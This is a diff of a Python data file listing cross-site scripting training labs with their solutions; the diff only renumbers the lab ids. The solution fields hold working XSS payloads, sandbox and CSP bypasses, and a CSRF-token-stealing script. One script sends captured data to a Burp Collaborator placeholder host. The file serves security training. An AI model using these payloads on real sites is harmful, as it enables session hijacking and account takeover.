@@ -1,6 +1,6 @@
 CROSS_SITE_SCRIPTING_LABS = [
     {
-        "id": "1",
+        "id": "0",
         "name": "Reflected XSS into HTML context with nothing encoded",
         "link": "/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded",
         "difficulty": "APPRENTICE",
@@ -10,7 +10,7 @@ CROSS_SITE_SCRIPTING_LABS = [
         "solution": "Copy and paste the following into the search box:  <script>alert(1)</script>   Click \"Search\"."
     },
     {
-        "id": "2",
+        "id": "1",
         "name": "Stored XSS into HTML context with nothing encoded",
         "link": "/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded",
         "difficulty": "APPRENTICE",
@@ -20,7 +20,7 @@ CROSS_SITE_SCRIPTING_LABS = [
         "solution": "Solution    Enter the following into the comment box:  <script>alert(1)</script>   Enter a name, email and website.  Click \"Post comment\".  Go back to the blog."
     },
     {
-        "id": "3",
+        "id": "2",
         "name": "DOM XSS in document.write sink using source location.search",
         "link": "/web-security/cross-site-scripting/dom-based/lab-document-write-sink",
         "difficulty": "APPRENTICE",
@@ -30,7 +30,7 @@ CROSS_SITE_SCRIPTING_LABS = [
         "solution": "Break out of the img attribute by searching for: \"><svg onload=alert(1)>"
     },
     {
-        "id": "4",
+        "id": "3",
         "name": "DOM XSS in innerHTML sink using source location.search",
         "link": "/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink",
         "difficulty": "APPRENTICE",
@@ -40,7 +40,7 @@ CROSS_SITE_SCRIPTING_LABS = [
         "solution": "Enter the following into the into the search box: <img src=1 onerror=alert(1)> Click \"Search\"."
     },
     {
-        "id": "5",
+        "id": "4",
         "name": "DOM XSS in jQuery anchor href attribute sink using location.search source",
         "link": "/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink",
         "difficulty": "APPRENTICE",
@@ -50,7 +50,7 @@ CROSS_SITE_SCRIPTING_LABS = [
         "solution": "Change returnPath to: javascript:alert(document.cookie) Hit enter and click \"back\"."
     },
     {
-        "id": "6",
+        "id": "5",
         "name": "DOM XSS in jQuery selector sink using a hashchange event",
         "link": "/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event",
         "difficulty": "APPRENTICE",
@@ -60,7 +60,7 @@ CROSS_SITE_SCRIPTING_LABS = [
         "solution": "In the Body section, add the following malicious iframe :  <iframe src=\"https://YOUR-LAB-ID.web-security-academy.net/#\" onload=\"this.src+='<img src=x onerror=print()>'\"></iframe>   Store the exploit, then click View exploit to confirm that the print() function is called.  Go back to the exploit server and click Deliver to victim to solve the lab."
     },
     {
-        "id": "7",
+        "id": "6",
         "name": "Reflected XSS into attribute with angle brackets HTML-encoded",
         "link": "/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded",
         "difficulty": "APPRENTICE",
@@ -70,7 +70,7 @@ CROSS_SITE_SCRIPTING_LABS = [
         "solution": "Submit a random alphanumeric string in the search box, then use Burp Suite to intercept the search request and send it to Burp Repeater.  Observe that the random string has been reflected inside a quoted attribute.   Replace your input with the following payload to escape the quoted attribute and inject an event handler:  \"onmouseover=\"alert(1)   Verify the technique worked by right-clicking, selecting \"Copy URL\", and pasting the URL in the browser. When you move the mouse over the injected element it should trigger an alert."
     },
     {
-        "id": "8",
+        "id": "7",
         "name": "Stored XSS into anchor href attribute with double quotes HTML-encoded",
         "link": "/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded",
         "difficulty": "APPRENTICE",
@@ -80,7 +80,7 @@ CROSS_SITE_SCRIPTING_LABS = [
         "solution": "Repeat the process again but this time replace your input with the following payload to inject a JavaScript URL that calls alert: javascript:alert(1). Verify the technique worked by right-clicking, selecting \"Copy URL\", and pasting the URL in the browser. Clicking the name above your comment should trigger an alert."
     },
     {
-        "id": "9",
+        "id": "8",
         "name": "Reflected XSS into a JavaScript string with angle brackets HTML encoded",
         "link": "/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded",
         "difficulty": "APPRENTICE",
@@ -90,7 +90,7 @@ CROSS_SITE_SCRIPTING_LABS = [
         "solution": "Replace your input with the following payload to break out of the JavaScript string and inject an alert: '-alert(1)-' Verify the technique worked by right clicking, selecting \"Copy URL\", and pasting the URL in the browser. When you load the page it should trigger an alert."
     },
     {
-        "id": "10",
+        "id": "9",
         "name": "DOM XSS in document.write sink using source location.search inside a select element",
         "link": "/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element",
         "difficulty": "PRACTITIONER",
@@ -100,7 +100,7 @@ CROSS_SITE_SCRIPTING_LABS = [
         "solution": "Add a storeId query parameter to the URL and enter a random alphanumeric string as its value. Request this modified URL. In the browser, notice that your random string is now listed as one of the options in the drop-down list. Right-click and inspect the drop-down list to confirm that the value of your storeId parameter has been placed inside a select element. Change the URL to include a suitable XSS payload inside the storeId parameter as follows: product?productId=1&storeId=\"></select><img%20src=1%20onerror=alert(1)>"
     },
     {
-        "id": "11",
+        "id": "10",
         "name": "DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded",
         "link": "/web-security/cross-site-scripting/dom-based/lab-angularjs-expression",
         "difficulty": "PRACTITIONER",
@@ -110,7 +110,7 @@ CROSS_SITE_SCRIPTING_LABS = [
         "solution": "Enter the following AngularJS expression in the search box: {{$on.constructor('alert(1)')()}} Click search."
     },
     {
-        "id": "12",
+        "id": "11",
         "name": "Reflected DOM XSS",
         "link": "/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected",
         "difficulty": "PRACTITIONER",
@@ -120,7 +120,7 @@ CROSS_SITE_SCRIPTING_LABS = [
         "solution": "To solve the lab, enter the following search term: \\\"-alert(1)}//. As you have injected a backslash and the site isn't escaping them, when the JSON response attempts to escape the opening double-quotes character, it adds a second backslash. The resulting double-backslash causes the escaping to be effectively canceled out. This means that the double-quotes are processed unescaped, which closes the string that should contain the search term. An arithmetic operator (in this case the subtraction operator) is then used to separate the expressions before the alert() function is called. Finally, a closing curly bracket and two forward slashes close the JSON object early and comment out what would have been the rest of the object. As a result, the response is generated as follows: {\"searchTerm\":\"\\\\\"-alert(1)}//\", \"results\":[]}."
     },
     {
-        "id": "13",
+        "id": "12",
         "name": "Stored DOM XSS",
         "link": "/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored",
         "difficulty": "PRACTITIONER",
@@ -130,7 +130,7 @@ CROSS_SITE_SCRIPTING_LABS = [
         "solution": "Post a comment containing the following vector: <><img src=1 onerror=alert(1)> We exploit this vulnerability by simply including an extra set of angle brackets at the beginning of the comment. These angle brackets will be encoded, but any subsequent angle brackets will be unaffected, enabling us to effectively bypass the filter and inject HTML."
     },
     {
-        "id": "14",
+        "id": "13",
         "name": "Reflected XSS into HTML context with most tags and attributes blocked",
         "link": "/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked",
         "difficulty": "PRACTITIONER",
@@ -140,7 +140,7 @@ CROSS_SITE_SCRIPTING_LABS = [
         "solution": "Go to the exploit server and paste the following code, replacing YOUR-LAB-ID with your lab ID:  <iframe src=\"https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E\" onload=this.style.width='100px'>   Click Store and Deliver exploit to victim ."
     },
     {
-        "id": "15",
+        "id": "14",
         "name": "Reflected XSS into HTML context with all tags blocked except custom ones",
         "link": "/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked",
         "difficulty": "PRACTITIONER",
@@ -150,7 +150,7 @@ CROSS_SITE_SCRIPTING_LABS = [
         "solution": "Go to the exploit server and paste the following code, replacing YOUR-LAB-ID with your lab ID:  <script>\nlocation = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';\n</script>   Click \"Store\" and \"Deliver exploit to victim\"."
     },
     {
-        "id": "16",
+        "id": "15",
         "name": "Reflected XSS with some SVG markup allowed",
         "link": "/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed",
         "difficulty": "PRACTITIONER",
@@ -160,7 +160,7 @@ CROSS_SITE_SCRIPTING_LABS = [
         "solution": "Open Burp's browser and use the search function in the lab. Send the resulting request to Burp Intruder. In the request template, replace the value of the search term with: <>. Place the cursor between the angle brackets and click Add \u00a7 to create a payload position. The value of the search term should now be: <\u00a7\u00a7>. Visit the XSS cheat sheet and click Copy tags to clipboard. In Burp Intruder, in the Payloads side panel, click Paste to paste the list of tags into the payloads list. Click Start attack. When the attack is finished, review the results. Observe that all payloads caused a 400 response, except for the ones using the <svg>, <animatetransform>, <title>, and <image> tags, which received a 200 response. Go back to the Intruder tab and replace your search term with: <svg><animatetransform%20=1>. Place the cursor before the = character and click Add \u00a7 to create a payload position. The value of the search term should now be: <svg><animatetransform%20\u00a7\u00a7=1>. Visit the XSS cheat sheet and click Copy events to clipboard. In Burp Intruder, in the Payloads side panel, click Clear to remove the previous payloads. Then click Paste to paste the list of attributes into the payloads list. Click Start attack. When the attack is finished, review the results. Note that all payloads caused a 400 response, except for the onbegin payload, which caused a 200 response. Visit the following URL in the browser to confirm that the alert() function is called and the lab is solved: https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E."
     },
     {
-        "id": "17",
+        "id": "16",
         "name": "Reflected XSS in canonical link tag",
         "link": "/web-security/cross-site-scripting/contexts/lab-canonical-link-tag",
         "difficulty": "PRACTITIONER",
@@ -170,7 +170,7 @@ CROSS_SITE_SCRIPTING_LABS = [
         "solution": "Visit the following URL, replacing YOUR-LAB-ID with your lab ID:  https://YOUR-LAB-ID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)  This sets the X key as an access key for the whole page. When a user presses the access key, the alert function is called."
     },
     {
-        "id": "18",
+        "id": "17",
         "name": "Reflected XSS into a JavaScript string with single quote and backslash escaped",
         "link": "/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped",
         "difficulty": "PRACTITIONER",
@@ -180,7 +180,7 @@ CROSS_SITE_SCRIPTING_LABS = [
         "solution": "Replace your input with the following payload to break out of the script block and inject a new script: </script><script>alert(1)</script> Verify the technique worked by right clicking, selecting \"Copy URL\", and pasting the URL in the browser. When you load the page it should trigger an alert."
     },
     {
-        "id": "19",
+        "id": "18",
         "name": "Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped",
         "link": "/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped",
         "difficulty": "PRACTITIONER",
@@ -190,7 +190,7 @@ CROSS_SITE_SCRIPTING_LABS = [
         "solution": "Replace your input with the following payload to break out of the JavaScript string and inject an alert:  \\'-alert(1)//   Verify the technique worked by right clicking, selecting \"Copy URL\", and pasting the URL in the browser. When you load the page it should trigger an alert."
     },
     {
-        "id": "20",
+        "id": "19",
         "name": "Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped",
         "link": "/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped",
         "difficulty": "PRACTITIONER",
@@ -200,7 +200,7 @@ CROSS_SITE_SCRIPTING_LABS = [
         "solution": "Repeat the process again but this time modify your input to inject a JavaScript URL that calls alert , using the following payload:  http://foo?&apos;-alert(1)-&apos;   Verify the technique worked by right-clicking, selecting \"Copy URL\", and pasting the URL in the browser. Clicking the name above your comment should trigger an alert."
     },
     {
-        "id": "21",
+        "id": "20",
         "name": "Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped",
         "link": "/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped",
         "difficulty": "PRACTITIONER",
@@ -210,7 +210,7 @@ CROSS_SITE_SCRIPTING_LABS = [
         "solution": "Replace your input with the following payload to execute JavaScript inside the template string: ${alert(1)} Verify the technique worked by right clicking, selecting \"Copy URL\", and pasting the URL in the browser. When you load the page it should trigger an alert."
     },
     {
-        "id": "22",
+        "id": "21",
         "name": "Exploiting cross-site scripting to steal cookies",
         "link": "/web-security/cross-site-scripting/exploiting/lab-stealing-cookies",
         "difficulty": "PRACTITIONER",
@@ -220,7 +220,7 @@ CROSS_SITE_SCRIPTING_LABS = [
         "solution": "Go back to the Collaborator tab, and click \"Poll now\". You should see an HTTP interaction. If you don't see any interactions listed, wait a few seconds and try again. Take a note of the value of the victim's cookie in the POST body. Reload the main blog page, using Burp Proxy or Burp Repeater to replace your own session cookie with the one you captured in Burp Collaborator. Send the request to solve the lab. To prove that you have successfully hijacked the admin user's session, you can use the same cookie in a request to /my-account to load the admin user's account page. Alternative solution: Alternatively, you could adapt the attack to make the victim post their session cookie within a blog comment by exploiting the XSS to perform CSRF. However, this is far less subtle because it exposes the cookie publicly, and also discloses evidence that the attack was performed."
     },
     {
-        "id": "23",
+        "id": "22",
         "name": "Exploiting cross-site scripting to capture passwords",
         "link": "/web-security/cross-site-scripting/exploiting/lab-capturing-passwords",
         "difficulty": "PRACTITIONER",
@@ -230,7 +230,7 @@ CROSS_SITE_SCRIPTING_LABS = [
         "solution": "Alternatively, you could adapt the attack to make the victim post their credentials within a blog comment by exploiting the XSS to perform CSRF . However, this is far less subtle because it exposes the username and password publicly, and also discloses evidence that the attack was performed."
     },
     {
-        "id": "24",
+        "id": "23",
         "name": "Exploiting XSS to bypass CSRF defenses",
         "link": "/web-security/cross-site-scripting/exploiting/lab-perform-csrf",
         "difficulty": "PRACTITIONER",
@@ -240,7 +240,7 @@ CROSS_SITE_SCRIPTING_LABS = [
         "solution": "Solution   Log in using the credentials provided. On your user account page, notice the function for updating your email address.  If you view the source for the page, you'll see the following information:  You need to issue a POST request to /my-account/change-email , with a parameter called email .  There's an anti-CSRF token in a hidden input called token .  This means your exploit will need to load the user account page, extract the CSRF token, and then use the token to change the victim's email address.   Submit the following payload in a blog comment:  <script>\nvar req = new XMLHttpRequest();\nreq.onload = handleResponse;\nreq.open('get','/my-account',true);\nreq.send();\nfunction handleResponse() {\n    var token = this.responseText.match(/name=\"csrf\" value=\"(\\w+)\"/)[1];\n    var changeReq = new XMLHttpRequest();\n    changeReq.open('post', '/my-account/change-email', true);\n    changeReq.send('csrf='+token+'&email=test@test.com')\n};\n</script>  This will make anyone who views the comment issue a POST request to change their email address to test@test.com ."
     },
     {
-        "id": "25",
+        "id": "24",
         "name": "Reflected XSS with AngularJS sandbox escape without strings",
         "link": "/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-without-strings",
         "difficulty": "EXPERT",
@@ -250,7 +250,7 @@ CROSS_SITE_SCRIPTING_LABS = [
         "solution": "Visit the following URL, replacing YOUR-LAB-ID with your lab ID:  https://YOUR-LAB-ID.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1"
     },
     {
-        "id": "26",
+        "id": "25",
         "name": "Reflected XSS with AngularJS sandbox escape and CSP",
         "link": "/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-and-csp",
         "difficulty": "EXPERT",
@@ -260,7 +260,7 @@ CROSS_SITE_SCRIPTING_LABS = [
         "solution": "Go to the exploit server and paste the following code, replacing YOUR-LAB-ID with your lab ID: <script> location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x'; </script> Click \"Store\" and \"Deliver exploit to victim\"."
     },
     {
-        "id": "27",
+        "id": "26",
         "name": "Reflected XSS with event handlers and href attributes blocked",
         "link": "/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked",
         "difficulty": "EXPERT",
@@ -270,7 +270,7 @@ CROSS_SITE_SCRIPTING_LABS = [
         "solution": "Solution  Visit the following URL, replacing YOUR-LAB-ID with your lab ID:  https://YOUR-LAB-ID.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E"
     },
     {
-        "id": "28",
+        "id": "27",
         "name": "Reflected XSS in a JavaScript URL with some characters blocked",
         "link": "/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked",
         "difficulty": "EXPERT",
@@ -280,7 +280,7 @@ CROSS_SITE_SCRIPTING_LABS = [
         "solution": "Visit the following URL, replacing YOUR-LAB-ID with your lab ID: https://YOUR-LAB-ID.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27 The lab will be solved, but the alert will only be called if you click \"Back to blog\" at the bottom of the page."
     },
     {
-        "id": "29",
+        "id": "28",
         "name": "Reflected XSS protected by very strict CSP, with dangling markup attack",
         "link": "/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack",
         "difficulty": "EXPERT",
@@ -290,7 +290,7 @@ CROSS_SITE_SCRIPTING_LABS = [
         "solution": "Log in to the lab using the account provided above.  Examine the change email function. Observe that there is an XSS vulnerability in the email parameter.  Go to the Collaborator tab.  Click \"Copy to clipboard\" to copy a unique Burp Collaborator payload to your clipboard.   Back in the lab, go to the exploit server and add the following code, replacing YOUR-LAB-ID and YOUR-EXPLOIT-SERVER-ID with your lab ID and exploit server ID respectively, and replacing YOUR-COLLABORATOR-ID with the payload that you just copied from Burp Collaborator.  <script>\nif(window.name) {\n\t\tnew Image().src='//BURP-COLLABORATOR-SUBDOMAIN?'+encodeURIComponent(window.name);\n\t\t} else {\n      \t\t\tlocation = 'https://YOUR-LAB-ID.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27';\n}\n</script>   Click \"Store\" and then \"Deliver exploit to victim\". When the user visits the website containing this malicious script, if they click on the \"Click me\" link while they are still logged in to the lab website, their browser will send a request containing their CSRF token to your malicious website. You can then steal this CSRF token using Burp Collaborator.  Go back to the Collaborator tab, and click \"Poll now\". If you don't see any interactions listed, wait a few seconds and try again. You should see an HTTP interaction that was initiated by the application. Select the HTTP interaction, go to the request tab, and copy the user's CSRF token.  With Burp's Intercept feature switched on, go back to the change email function of the lab and submit a request to change the email to any random address.  In Burp, go to the intercepted request and change the value of the email parameter to hacker@evil-user.net .  Right-click on the request and, from the context menu, select \"Engagement tools\" and then \"Generate CSRF PoC\". The popup shows both the request and the CSRF HTML that is generated by it. In the request, replace the CSRF token with the one that you stole from the victim earlier.  Click \"Options\" and make sure that the \"Include auto-submit script\" is activated.  Click \"Regenerate\" to update the CSRF HTML so that it contains the stolen token, then click \"Copy HTML\" to save it to your clipboard.  Drop the request and switch off the intercept feature.  Go back to the exploit server and paste the CSRF HTML into the body. You can overwrite the script that we entered earlier.  Click \"Store\" and \"Deliver exploit to victim\". The user's email will be changed to hacker@evil-user.net ."
     },
     {
-        "id": "30",
+        "id": "29",
         "name": "Reflected XSS protected by CSP, with CSP bypass",
         "link": "/web-security/cross-site-scripting/content-security-policy/lab-csp-bypass",
         "difficulty": "EXPERT",
